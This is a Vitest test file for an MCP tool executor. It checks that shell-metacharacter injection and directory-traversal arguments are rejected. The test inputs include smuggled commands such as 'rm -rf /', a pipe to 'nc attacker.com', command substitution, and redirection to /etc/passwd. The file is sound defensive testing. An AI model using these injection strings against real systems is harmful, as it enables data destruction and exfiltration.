import { beforeEach, describe, expect, it } from 'vitest';
import { z } from 'zod';

const importModule = async () => import('../../src/mcp/tool-registry.js');

describe('Command Argument Validation (GAP-CMD-001)', () => {
	describe('Shell metacharacter detection', () => {
		it('should reject arguments containing semicolon', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						args: z.array(z.string()).default([]),
						userInput: z.string().optional(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['ls'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'ls', userInput: 'foo; rm -rf /' },
					callId: 'call-1',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing pipe', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						filter: z.string().optional(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['grep'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'grep', filter: 'pattern | nc attacker.com' },
					callId: 'call-2',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing ampersand', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						value: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['echo'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'echo', value: 'test & malicious_command' },
					callId: 'call-3',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing backticks', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						name: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['ls'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'ls', name: 'test`whoami`' },
					callId: 'call-4',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing dollar sign', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						path: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['cat'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'cat', path: '$(malicious_command)' },
					callId: 'call-5',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing parentheses', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						expr: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['bash'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'bash', expr: '(subshell_command)' },
					callId: 'call-6',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing braces', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						pattern: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['rm'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'rm', pattern: '{important,file}.txt' },
					callId: 'call-7',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing brackets', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						chars: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['rm'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'rm', chars: '[abc]' },
					callId: 'call-8',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing angle brackets', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						redirect: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['cat'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'cat', redirect: '> /etc/passwd' },
					callId: 'call-9',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing exclamation mark', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						history: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['bash'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'bash', history: '!!dangerous' },
					callId: 'call-10',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing hash/pound sign', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						comment: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['bash'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'bash', comment: 'test # hidden command' },
					callId: 'call-11',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});

		it('should reject arguments containing tilde', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						home: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['cat'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'cat', home: '~/sensitive.txt' },
					callId: 'call-12',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/shell metacharacters/i);
		});
	});

	describe('Valid arguments', () => {
		it('should accept clean string arguments', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						file: z.string(),
					}),
					handler: async (args) => ({
						callId: 'c1',
						success: true,
						content: `Reading ${args.file}`,
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['cat'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'cat', file: 'data/test.txt' },
					callId: 'call-ok',
				},
				5000,
			);

			expect(result.success).toBe(true);
			expect(result.content).toContain('data/test.txt');
		});

		it('should accept commands without string arguments', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						count: z.number(),
						enabled: z.boolean(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['process'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'process', count: 10, enabled: true },
					callId: 'call-ok',
				},
				5000,
			);

			expect(result.success).toBe(true);
		});

		it('should accept alphanumeric strings with hyphens and underscores', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						name: z.string(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['create'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'create', name: 'my-file_name123.txt' },
					callId: 'call-ok',
				},
				5000,
			);

			expect(result.success).toBe(true);
		});
	});
});

describe('CWD Path Validation (GAP-CMD-001)', () => {
	describe('Path traversal attacks', () => {
		it('should reject cwd with parent directory traversal', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						cwd: z.string().optional(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, {
				commandAllowlist: ['ls'],
				basePath: '/home/axel/workspace',
			});

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'ls', cwd: '../../../etc' },
					callId: 'call-1',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/escapes base directory/i);
		});

		it('should reject absolute cwd outside base path', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						cwd: z.string().optional(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, {
				commandAllowlist: ['ls'],
				basePath: '/home/axel/workspace',
			});

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'ls', cwd: '/etc/passwd' },
					callId: 'call-2',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/escapes base directory/i);
		});

		it('should reject non-string cwd values', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						cwd: z.any().optional(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, {
				commandAllowlist: ['ls'],
				basePath: '/home/axel/workspace',
			});

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'ls', cwd: { path: '/etc' } },
					callId: 'call-3',
				},
				5000,
			);

			expect(result.success).toBe(false);
			expect(result.error).toMatch(/cwd must be a string/i);
		});
	});

	describe('Valid cwd paths', () => {
		it('should accept cwd within base path', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						cwd: z.string().optional(),
					}),
					handler: async (args) => ({
						callId: 'c1',
						success: true,
						content: `Working in ${args.cwd}`,
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, {
				commandAllowlist: ['ls'],
				basePath: '/home/axel/workspace',
			});

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'ls', cwd: 'subdir/nested' },
					callId: 'call-ok',
				},
				5000,
			);

			expect(result.success).toBe(true);
		});

		it('should accept missing cwd parameter', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						cwd: z.string().optional(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, {
				commandAllowlist: ['ls'],
				basePath: '/home/axel/workspace',
			});

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'ls' },
					callId: 'call-ok',
				},
				5000,
			);

			expect(result.success).toBe(true);
		});

		it('should not validate cwd when basePath is not set', async () => {
			const { ToolRegistry, defineTool, McpToolExecutor } = await importModule();
			const registry = new ToolRegistry();

			registry.register(
				defineTool({
					name: 'execute_command',
					description: 'Execute a system command',
					category: 'system',
					schema: z.object({
						command: z.string(),
						cwd: z.string().optional(),
					}),
					handler: async () => ({
						callId: 'c1',
						success: true,
						content: 'executed',
						durationMs: 5,
					}),
				}),
			);

			const executor = new McpToolExecutor(registry, { commandAllowlist: ['ls'] });

			const result = await executor.execute(
				{
					toolName: 'execute_command',
					args: { command: 'ls', cwd: '/any/path' },
					callId: 'call-ok',
				},
				5000,
			);

			expect(result.success).toBe(true);
		});
	});
});
